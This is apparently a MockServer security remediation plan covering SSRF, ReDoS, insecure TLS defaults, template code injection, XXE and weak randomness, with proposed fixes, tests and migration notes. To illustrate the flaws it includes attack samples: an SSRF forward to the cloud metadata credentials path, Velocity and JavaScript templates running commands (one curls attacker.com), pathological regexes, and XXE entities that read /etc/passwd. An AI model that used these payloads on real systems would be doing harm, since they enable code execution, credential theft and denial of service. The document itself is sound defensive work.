# Security Remediation Plan

**Status:** Active Implementation Plan  
**Created:** May 4, 2026  
**Priority:** CRITICAL - All items are security vulnerabilities  
**Estimated Total Effort:** 17-22 days

---

## Executive Summary

This plan addresses **12 critical and high-priority security vulnerabilities** identified in the comprehensive code review. All **correctness issues (COR-*)** have been resolved. The remaining work focuses exclusively on security hardening.

### Current Security Posture

**✅ Resolved:**
- COR-1: Triple-NOT Logic Bug (fixed)
- COR-2: ByteBuf Memory Leak (fixed)
- COR-3: ALPN Race Condition (fixed)
- COR-9: MultiValueMapMatcher DoS (fixed with limits)

**⚠️ Critical Security Issues (5):**
- SEC-1: SSRF in forward handlers
- SEC-2: ReDoS in regex matcher
- SEC-3: Trust-all TLS by default (BREAKING CHANGE)
- SEC-4: Velocity template class loading enabled (BREAKING CHANGE)
- SEC-5: JsonPath DoS

**⚠️ High Priority Security Issues (7):**
- SEC-6: XPath DoS
- SEC-7: XXE attack vector
- SEC-8: JavaScript class access (BREAKING CHANGE)
- SEC-9: Weak cryptographic random
- SEC-10: Weak TLS protocol versions (minor breaking)
- SEC-11: Unbounded request/response body size
- PER-1: Ring buffer power-of-2 documentation gap

---

## Implementation Phases

### Phase 1: Non-Breaking Critical Fixes (Week 1-2)
**Effort:** 8-11 days  
**Breaking Changes:** None  
**Goal:** Address highest-impact vulnerabilities without breaking existing deployments

### Phase 2: Breaking Security Defaults (Week 3)
**Effort:** 3 days  
**Breaking Changes:** Yes (requires migration guide)  
**Goal:** Fix insecure defaults with proper deprecation path

### Phase 3: High Priority Remaining (Week 4)
**Effort:** 6-8 days  
**Breaking Changes:** Minor  
**Goal:** Complete security hardening

---

## Phase 1: Non-Breaking Critical Fixes

### SEC-1: SSRF in Forward Handlers

**Severity:** CRITICAL  
**CWE:** CWE-918 (Server-Side Request Forgery)  
**Effort:** 2-3 days  
**Breaking:** No

#### Problem

Forward action handlers accept arbitrary host/port from expectations without validation. Attackers can create expectations that forward requests to:
- Internal services (`127.0.0.1`, `localhost`)
- Cloud metadata endpoints (`169.254.169.254`)
- Private networks (RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)

#### Attack Scenario

```java
// Attacker creates malicious expectation
mockServerClient
    .when(request().withPath("/attack"))
    .forward(forward()
        .withHost("169.254.169.254")
        .withPort(80)
        .withPath("/latest/meta-data/iam/security-credentials/"));

// Result: Exposes AWS credentials to attacker
```

#### Solution

**Create new validator:**

`mockserver-core/src/main/java/org/mockserver/network/InetAddressValidator.java`

```java
package org.mockserver.network;

import org.mockserver.configuration.ConfigurationProperties;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class InetAddressValidator {
    
    public static void validateForwardTarget(String host, int port) {
        if (!ConfigurationProperties.forwardProxyBlockPrivateNetworks()) {
            return;  // Validation disabled
        }
        
        try {
            InetAddress addr = InetAddress.getByName(host);
            
            // Block RFC 1918 private ranges
            if (addr.isSiteLocalAddress()) {
                throw new IllegalArgumentException(
                    "Forward to private network blocked: " + host + 
                    " (RFC 1918). Set forwardProxyBlockPrivateNetworks=false to allow."
                );
            }
            
            // Block loopback
            if (addr.isLoopbackAddress()) {
                throw new IllegalArgumentException(
                    "Forward to localhost blocked: " + host + 
                    ". Set forwardProxyBlockPrivateNetworks=false to allow."
                );
            }
            
            // Block AWS metadata endpoint
            String ip = addr.getHostAddress();
            if (ip.equals("169.254.169.254") || ip.equals("fd00:ec2::254")) {
                throw new IllegalArgumentException(
                    "Forward to cloud metadata endpoint blocked: " + host
                );
            }
            
            // Block link-local (RFC 3927)
            if (addr.isLinkLocalAddress()) {
                throw new IllegalArgumentException(
                    "Forward to link-local address blocked: " + host
                );
            }
            
        } catch (UnknownHostException e) {
            throw new IllegalArgumentException("Invalid forward host: " + host, e);
        }
    }
}
```

**Add configuration property:**

`ConfigurationProperties.java` (add after line 686):

```java
/**
 * If true (default), blocks forwarding to private networks (RFC 1918), localhost,
 * and cloud metadata endpoints (169.254.169.254) to prevent SSRF attacks.
 * <p>
 * The default is true
 *
 * @return whether to block private network forwarding
 */
public static boolean forwardProxyBlockPrivateNetworks() {
    return Boolean.parseBoolean(readPropertyHierarchically(
        PROPERTIES,
        "mockserver.forwardProxyBlockPrivateNetworks",
        "MOCKSERVER_FORWARD_PROXY_BLOCK_PRIVATE_NETWORKS",
        "true"
    ));
}

public static void forwardProxyBlockPrivateNetworks(boolean block) {
    setProperty("mockserver.forwardProxyBlockPrivateNetworks", "" + block);
}
```

**Update forward handlers:**

`HttpForwardActionHandler.java` (add before line 21):

```java
import org.mockserver.network.InetAddressValidator;

// In sendRequest() method, add validation:
InetAddressValidator.validateForwardTarget(
    httpRequest.socketAddressFromHostHeader().getHostName(),
    httpRequest.socketAddressFromHostHeader().getPort()
);
```

`HttpForwardTemplateActionHandler.java` (add after template evaluation, line 45):

```java
InetAddressValidator.validateForwardTarget(
    httpRequest.socketAddressFromHostHeader().getHostName(),
    httpRequest.socketAddressFromHostHeader().getPort()
);
```

#### Tests Required

`mockserver-core/src/test/java/org/mockserver/network/InetAddressValidatorTest.java`

- ✅ Allow public IPs
- ✅ Block 127.0.0.1
- ✅ Block localhost
- ✅ Block ::1 (IPv6 loopback)
- ✅ Block 10.0.0.0/8
- ✅ Block 172.16.0.0/12
- ✅ Block 192.168.0.0/16
- ✅ Block 169.254.169.254 (AWS metadata)
- ✅ Block fd00:ec2::254 (AWS IPv6 metadata)
- ✅ Allow when forwardProxyBlockPrivateNetworks=false

`HttpForwardActionHandlerSSRFTest.java`

- ✅ Integration tests with actual forward actions

---

### SEC-2: ReDoS in Regex Matcher

**Severity:** CRITICAL  
**CWE:** CWE-1333 (Inefficient Regular Expression Complexity)  
**Effort:** 3-5 days  
**Breaking:** No

#### Problem

User-provided regex patterns are compiled and executed without timeout or complexity analysis. Pathological patterns cause exponential backtracking:

```java
// Attack pattern: (a+)+b
// Input: "aaaaaaaaaaaaaaaaaaaaac"  (20 'a's + 'c')
// Result: O(2^n) backtracking → CPU exhaustion
```

#### Solution Options

**Option 1: Thread-based Timeout (Quick, 3 days)**

`RegexStringMatcher.java` (replace lines 94-96):

```java
private boolean matchesWithTimeout(Pattern pattern, String input) {
    ExecutorService executor = Executors.newSingleThreadExecutor(
        new ThreadFactoryBuilder()
            .setNameFormat("regex-eval-%d")
            .setDaemon(true)
            .build()
    );
    
    Future<Boolean> future = executor.submit(() -> 
        pattern.matcher(input).matches()
    );
    
    try {
        return future.get(
            configuration.regexMatchingTimeoutMillis(), 
            TimeUnit.MILLISECONDS
        );
    } catch (TimeoutException e) {
        future.cancel(true);
        mockServerLogger.logEvent(new LogEntry()
            .setType(WARN)
            .setLogLevel(WARN)
            .setMessageFormat("Regex evaluation timeout after {}ms: {}")
            .setArguments(configuration.regexMatchingTimeoutMillis(), pattern.pattern()));
        return false;
    } catch (Exception e) {
        return false;
    } finally {
        executor.shutdownNow();
    }
}
```

**Option 2: RE2/J Library (Better, 5 days)**

`pom.xml` (add dependency):

```xml
<dependency>
    <groupId>com.google.re2j</groupId>
    <artifactId>re2j</artifactId>
    <version>1.7</version>
</dependency>
```

`RegexStringMatcher.java`:

```java
import com.google.re2j.Pattern;  // Replace java.util.regex.Pattern

// RE2 guarantees O(n) execution time - no exponential backtracking possible
```

**Recommendation:** Start with Option 1 (quick win), migrate to Option 2 in next release.

**Configuration:**

```java
public static long regexMatchingTimeoutMillis() {
    return Long.parseLong(readPropertyHierarchically(
        PROPERTIES,
        "mockserver.regexMatchingTimeoutMillis",
        "MOCKSERVER_REGEX_MATCHING_TIMEOUT_MILLIS",
        "1000"  // 1 second default
    ));
}
```

#### Tests Required

`RegexStringMatcherReDoSTest.java`

- ✅ Timeout on (a+)+b pattern
- ✅ Timeout on (a*)*b pattern
- ✅ Timeout on (a|a)*b pattern
- ✅ Allow simple patterns
- ✅ Configurable timeout

---

### SEC-5: JsonPath DoS

**Severity:** CRITICAL  
**CWE:** CWE-400 (Uncontrolled Resource Consumption)  
**Effort:** 2-3 days  
**Breaking:** No

#### Problem

JsonPath expressions with recursive descent (`..`) can cause exponential traversal without timeout or depth limits:

```javascript
// Attack JsonPath: $..*..*..*..*
// On deeply nested JSON (1000 levels): O(n^k) traversal
```

#### Solution

`JsonPathMatcher.java` (add executor service and timeout):

```java
private static final ExecutorService executor = Executors.newCachedThreadPool(
    new ThreadFactoryBuilder()
        .setNameFormat("jsonpath-eval-%d")
        .setDaemon(true)
        .build()
);

@Override
public boolean matches(MatchingContext context, String matched) {
    boolean result = false;
    
    if (jsonPath == null) {
        mockServerLogger.logEvent(new LogEntry()
            .setType(WARN)
            .setMessageFormat("Failed to create JsonPath for: {}")
            .setArguments(matcher));
        return false;
    }
    
    try {
        if (matcher.equalsIgnoreCase(matched)) {
            result = true;
        } else {
            Future<Object> future = executor.submit(() -> jsonPath.read(matched));
            Object jsonPathResult = future.get(
                configuration.jsonPathMatchingTimeoutMillis(),
                TimeUnit.MILLISECONDS
            );
            
            if (jsonPathResult instanceof Collection) {
                result = !((Collection<?>) jsonPathResult).isEmpty();
            } else {
                result = jsonPathResult != null;
            }
        }
    } catch (TimeoutException e) {
        mockServerLogger.logEvent(new LogEntry()
            .setType(WARN)
            .setLogLevel(WARN)
            .setMessageFormat("JsonPath evaluation timeout after {}ms: {}")
            .setArguments(configuration.jsonPathMatchingTimeoutMillis(), matcher));
        result = false;
    } catch (Throwable throwable) {
        result = false;
    }
    
    return not != result;
}
```

**Configuration:**

```java
public static long jsonPathMatchingTimeoutMillis() {
    return Long.parseLong(readPropertyHierarchically(
        PROPERTIES,
        "mockserver.jsonPathMatchingTimeoutMillis",
        "MOCKSERVER_JSON_PATH_MATCHING_TIMEOUT_MILLIS",
        "1000"
    ));
}
```

#### Tests Required

`JsonPathMatcherDoSTest.java`

- ✅ Timeout on recursive descent with deeply nested JSON
- ✅ Allow simple JsonPath expressions
- ✅ Configurable timeout

---

## Phase 2: Breaking Security Defaults

### SEC-3: Trust-All TLS by Default

**Severity:** CRITICAL  
**CWE:** CWE-295 (Improper Certificate Validation)  
**Effort:** 1 day  
**Breaking:** YES

#### Problem

Forward proxy uses `InsecureTrustManagerFactory.INSTANCE` by default (`forwardProxyTLSX509CertificatesTrustManagerType = "ANY"`). This accepts:
- Self-signed certificates
- Expired certificates
- Invalid certificate chains
- Wrong hostnames

#### Solution

`ConfigurationProperties.java:1595` - Change default:

```java
public static String forwardProxyTlsX509CertificatesTrustManagerType() {
    return readPropertyHierarchically(
        PROPERTIES,
        "mockserver.forwardProxyTlsX509CertificatesTrustManagerType",
        "MOCKSERVER_FORWARD_PROXY_TLS_X509_CERTIFICATES_TRUST_MANAGER_TYPE",
-       "ANY"  // OLD: Insecure default
+       "JVM"  // NEW: Use JVM trust store (secure default)
    );
}
```

`NettySslContextFactory.java:110` - Add loud warning:

```java
if (configuration.forwardProxyTlsX509CertificatesTrustManagerType().equals("ANY")) {
    mockServerLogger.logEvent(new LogEntry()
        .setType(WARN)
        .setLogLevel(WARN)
        .setMessageFormat("⚠️  SECURITY WARNING: Forward proxy is configured to trust ALL certificates " +
            "(forwardProxyTlsX509CertificatesTrustManagerType=ANY). This disables certificate validation " +
            "and should only be used in development."));
    sslContextBuilder.trustManager(InsecureTrustManagerFactory.INSTANCE);
}
```

#### Migration Guide

Add to release notes:

```markdown
### Breaking Change: TLS Forward Proxy Now Validates Certificates

**Old behavior:** Accepted all certificates (self-signed, expired, wrong hostname)  
**New behavior:** Uses JVM trust store (same as normal Java HTTPS)

**Migration:** If you need to forward to self-signed certificates, set:

```properties
mockserver.forwardProxyTLSX509CertificatesTrustManagerType=ANY
```

⚠️ **Security Warning:** This disables certificate validation. Only use in development.
```

#### Tests Required

- Update `NettySslContextFactoryTest.java` assertions for new default

---

### SEC-4: Velocity Template Class Loading

**Severity:** CRITICAL  
**CWE:** CWE-94 (Code Injection)  
**Effort:** 1 day  
**Breaking:** YES

#### Problem

Velocity template engine allows class loading by default. Attackers can instantiate arbitrary classes:

```velocity
## Attack template
#set($runtime = $Class.forName("java.lang.Runtime").getRuntime())
#set($process = $runtime.exec("curl attacker.com"))
```

#### Solution

`ConfigurationProperties.java:836` - Change default:

```java
public static boolean velocityDisallowClassLoading() {
    return Boolean.parseBoolean(readPropertyHierarchically(
        PROPERTIES,
        "mockserver.velocityDisallowClassLoading",
        "MOCKSERVER_VELOCITY_DISALLOW_CLASS_LOADING",
-       "false"  // OLD: Class loading enabled
+       "true"   // NEW: Class loading blocked
    ));
}
```

`VelocityTemplateEngine.java:88-89` - Add warning:

```java
if (!configuration.velocityDisallowClassLoading()) {
    mockServerLogger.logEvent(new LogEntry()
        .setType(WARN)
        .setLogLevel(WARN)
        .setMessageFormat("⚠️  SECURITY WARNING: Velocity class loading is enabled. " +
            "Templates can instantiate arbitrary Java classes. Only use if templates are from trusted sources."));
} else {
    velocityProperties.put(RuntimeConstants.UBERSPECT_CLASSNAME, SecureUberspector.class.getName());
}
```

#### Migration Guide

```markdown
### Breaking Change: Velocity Templates No Longer Allow Class Loading

**Old behavior:** Templates could instantiate arbitrary Java classes  
**New behavior:** Class loading blocked via SecureUberspector

**Migration:** If you need class loading (not recommended), set:

```properties
mockserver.velocityDisallowClassLoading=false
```

⚠️ **Security Warning:** This enables arbitrary code execution. Only use if templates are from trusted sources.
```

---

### SEC-8: JavaScript Template Class Access

**Severity:** HIGH  
**CWE:** CWE-94 (Code Injection)  
**Effort:** 2 days  
**Breaking:** YES

#### Problem

JavaScript template engine exposes all classes by default. Attackers can access arbitrary Java classes:

```javascript
// Attack
var Runtime = Java.type("java.lang.Runtime");
var process = Runtime.getRuntime().exec("whoami");
```

#### Solution

Switch to allowlist approach:

`ConfigurationProperties.java` (add new property):

```java
public static String javascriptAllowedClasses() {
    return readPropertyHierarchically(
        PROPERTIES,
        "mockserver.javascriptAllowedClasses",
        "MOCKSERVER_JAVASCRIPT_ALLOWED_CLASSES",
        "java.lang.String,java.lang.Integer,java.lang.Long,java.lang.Double,java.lang.Boolean," +
        "java.util.List,java.util.Map,java.util.Set,java.util.ArrayList,java.util.HashMap"
    );
}
```

`JavaScriptTemplateEngine.java:150-157` - Implement allowlist:

```java
Set<String> allowedClasses = new HashSet<>(Arrays.asList(
    configuration.javascriptAllowedClasses().split(",")
));

scriptEngine.put("Java", new RestrictedJavaAccess(allowedClasses));
```

#### Migration Guide

```markdown
### Breaking Change: JavaScript Templates Have Restricted Class Access

**Old behavior:** All Java classes accessible via `Java.type()`  
**New behavior:** Only allowlisted classes accessible

**Default allowlist:** String, Integer, Long, Double, Boolean, List, Map, Set, ArrayList, HashMap

**Migration:** Add required classes to allowlist:

```properties
mockserver.javascriptAllowedClasses=java.lang.String,java.util.Map,com.example.MyClass
```
```

---

## Phase 3: High Priority Remaining

### SEC-6: XPath DoS

**Severity:** HIGH  
**Effort:** 1 day  
**Breaking:** No

**Solution:** Apply same timeout mechanism as JsonPath (SEC-5).

---

### SEC-7: XXE Attack Vector

**Severity:** HIGH  
**CWE:** CWE-611 (XML External Entity)  
**Effort:** 2 days  
**Breaking:** No

#### Problem

XML parsing via XMLUnit may not disable external entities by default, allowing:
- File disclosure: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- SSRF: `<!ENTITY xxe SYSTEM "http://internal.server/">`
- Billion Laughs DoS

#### Solution

`XmlStringMatcher.java:36-42` - Disable external entities:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

Document doc = dbf.newDocumentBuilder().parse(
    new InputSource(new StringReader(matcher.getValue()))
);

this.diffBuilder = DiffBuilder.compare(Input.fromDocument(doc))
    .ignoreComments()
    // ... rest unchanged
```

Apply to:
- `XmlStringMatcher.java`
- `XmlSchemaMatcher.java`
- `XPathEvaluator.java`

---

### SEC-9: Weak Cryptographic Random

**Severity:** HIGH  
**CWE:** CWE-338 (Use of Cryptographically Weak PRNG)  
**Effort:** 1 day  
**Breaking:** No

#### Solution

Replace all `new Random()` with `new SecureRandom()`:

```java
// BCKeyAndCertificateFactory.java:179, 302
- BigInteger serial = BigInteger.valueOf(new Random().nextInt(Integer.MAX_VALUE));
+ BigInteger serial = new BigInteger(64, new SecureRandom());

// UUIDService.java:10
- private static final RandomBasedGenerator RANDOM_BASED_GENERATOR = 
      Generators.randomBasedGenerator(new Random());
+ private static final RandomBasedGenerator RANDOM_BASED_GENERATOR = 
      Generators.randomBasedGenerator(new SecureRandom());

// TemplateFunctions.java:17
- private static final Random random = new Random();
+ private static final SecureRandom random = new SecureRandom();
```

---

### SEC-10: Weak TLS Protocol Versions

**Severity:** MEDIUM  
**Effort:** 0.5 days  
**Breaking:** Minor

#### Solution

`ConfigurationProperties.java:1394`:

```java
- return readPropertyHierarchically(..., "TLSv1,TLSv1.1,TLSv1.2");
+ return readPropertyHierarchically(..., "TLSv1.2,TLSv1.3");
```

TLSv1.0/1.1 are deprecated per RFC 8996 and vulnerable to BEAST, POODLE.

---

### SEC-11: Unbounded Request/Response Bodies

**Severity:** MEDIUM  
**Effort:** 2 days  
**Breaking:** No

#### Solution

Replace all `Integer.MAX_VALUE` with configurable limits:

```java
public static int maxRequestBodySize() {
    return readIntegerProperty(..., 10485760);  // 10MB default
}

public static int maxResponseBodySize() {
    return readIntegerProperty(..., 52428800);  // 50MB default
}
```

Update all pipeline initializers in `PortUnificationHandler.java`.

---

### PER-1: Ring Buffer Power-of-2 Documentation

**Severity:** LOW (Documentation gap)  
**Effort:** 0.5 days  
**Breaking:** No

#### Solution

Update consumer docs:

`jekyll-www.mock-server.com/mock_server/configuration_properties.html:120-132`

```markdown
**Important:** Due to LMAX Disruptor requirements, the ring buffer size is rounded up to the 
next power of 2. For example, setting `maxLogEntries=10000` allocates a ring buffer with 
16,384 slots (63.8% overhead). To minimize waste, choose power-of-2 values: 1024, 2048, 
4096, 8192, 16384, 32768, 65536.

Recommended values:
- Small: 4,096 (~32MB)
- Medium: 16,384 (~131MB)  
- Large: 65,536 (~524MB)
```

---

## Testing Strategy

### Security Test Categories

1. **Attack simulation tests** - Actual exploit attempts
2. **Boundary tests** - Limits and edge cases
3. **Configuration tests** - All security properties
4. **Regression tests** - Ensure fixes don't break functionality

### Minimum Test Coverage Per Issue

- Each critical issue: 10+ tests
- Each high issue: 5+ tests
- All breaking changes: Migration path tested

---

## Release Strategy

### Version Numbering

**Recommendation:** Major version bump (5.x → 6.0.0) due to breaking changes

### Release Notes Structure

```markdown
# MockServer 6.0.0 - Security Hardening Release

## Security Fixes (12 issues resolved)

### Critical (5)
- SEC-1: Fixed SSRF vulnerability in forward handlers
- SEC-2: Added ReDoS protection with regex timeout
- SEC-3: ⚠️ BREAKING: Changed default TLS trust mode to JVM
- SEC-4: ⚠️ BREAKING: Disabled Velocity class loading by default
- SEC-5: Added JsonPath DoS protection with timeout

### High Priority (7)
- SEC-6: Added XPath DoS protection
- SEC-7: Fixed XXE vulnerability in XML parsing
- SEC-8: ⚠️ BREAKING: Restricted JavaScript class access to allowlist
- SEC-9: Replaced weak Random with SecureRandom
- SEC-10: ⚠️ MINOR BREAKING: Removed deprecated TLS 1.0/1.1
- SEC-11: Added configurable request/response body size limits
- PER-1: Documented ring buffer power-of-2 sizing

## Migration Guide

[Include all breaking change migrations here]
```

---

## Implementation Checklist

### Phase 1 (Week 1-2)

- [ ] SEC-1: SSRF Protection
  - [ ] Create InetAddressValidator
  - [ ] Add configuration property
  - [ ] Update HttpForwardActionHandler
  - [ ] Update HttpForwardTemplateActionHandler
  - [ ] Write 10+ tests
  - [ ] Update consumer docs

- [ ] SEC-2: ReDoS Protection
  - [ ] Choose approach (timeout vs RE2/J)
  - [ ] Update RegexStringMatcher
  - [ ] Add configuration property
  - [ ] Write 10+ tests

- [ ] SEC-5: JsonPath DoS
  - [ ] Add executor service
  - [ ] Add timeout mechanism
  - [ ] Add configuration property
  - [ ] Write 10+ tests

### Phase 2 (Week 3)

- [ ] SEC-3: Trust-All TLS
  - [ ] Change default in ConfigurationProperties
  - [ ] Add warning in NettySslContextFactory
  - [ ] Update tests
  - [ ] Write migration guide
  - [ ] Update consumer docs

- [ ] SEC-4: Velocity Class Loading
  - [ ] Change default in ConfigurationProperties
  - [ ] Add warning in VelocityTemplateEngine
  - [ ] Write tests
  - [ ] Write migration guide

- [ ] SEC-8: JavaScript Class Access
  - [ ] Implement allowlist approach
  - [ ] Add configuration property
  - [ ] Write tests
  - [ ] Write migration guide

### Phase 3 (Week 4)

- [ ] SEC-6: XPath DoS
  - [ ] Apply JsonPath solution
  - [ ] Write tests

- [ ] SEC-7: XXE Protection
  - [ ] Update XmlStringMatcher
  - [ ] Update XmlSchemaMatcher
  - [ ] Update XPathEvaluator
  - [ ] Write 10+ tests

- [ ] SEC-9: Weak Random
  - [ ] Fix BCKeyAndCertificateFactory
  - [ ] Fix UUIDService
  - [ ] Fix TemplateFunctions
  - [ ] Update tests

- [ ] SEC-10: Weak TLS
  - [ ] Update default protocols
  - [ ] Update docs

- [ ] SEC-11: Unbounded Bodies
  - [ ] Add configuration properties
  - [ ] Update all pipeline initializers
  - [ ] Write tests

- [ ] PER-1: Documentation
  - [ ] Update configuration_properties.html

---

## Risk Assessment

### Implementation Risks

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|---------|------------|
| Breaking changes break users | HIGH | HIGH | Clear migration guide, loud warnings, major version bump |
| Tests missed edge cases | MEDIUM | MEDIUM | Comprehensive test plans, adversarial review |
| Performance degradation | LOW | MEDIUM | Timeouts are configurable, validation is O(n) |
| Incomplete fix coverage | LOW | HIGH | This plan covers all identified issues |

### Deployment Risks

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|---------|------------|
| Users unaware of breaking changes | HIGH | HIGH | Release notes, migration guide, warning logs |
| Legitimate use cases blocked | MEDIUM | MEDIUM | All limits/restrictions are configurable |
| Production incidents | LOW | HIGH | Phased rollout, clear rollback path |

---

## Success Criteria

- [ ] All 12 security issues resolved
- [ ] 100% test pass rate
- [ ] Zero regressions in existing functionality
- [ ] Migration guide complete and tested
- [ ] Consumer documentation updated
- [ ] Release notes published
- [ ] Breaking changes clearly communicated

---

## Post-Release Monitoring

### Metrics to Track

1. **Limit violations** - How often do users hit new limits?
2. **Configuration overrides** - Which defaults are users changing?
3. **Warning log frequency** - Are users using insecure modes?
4. **GitHub issues** - Migration problems or false positives?

### Support Plan

- Monitor GitHub issues for migration problems
- Update FAQ with common issues
- Consider hotfix releases for critical migration issues

---

**Plan Status:** Ready for implementation  
**Next Action:** Begin Phase 1 implementation  
**Target Completion:** 4 weeks from start date
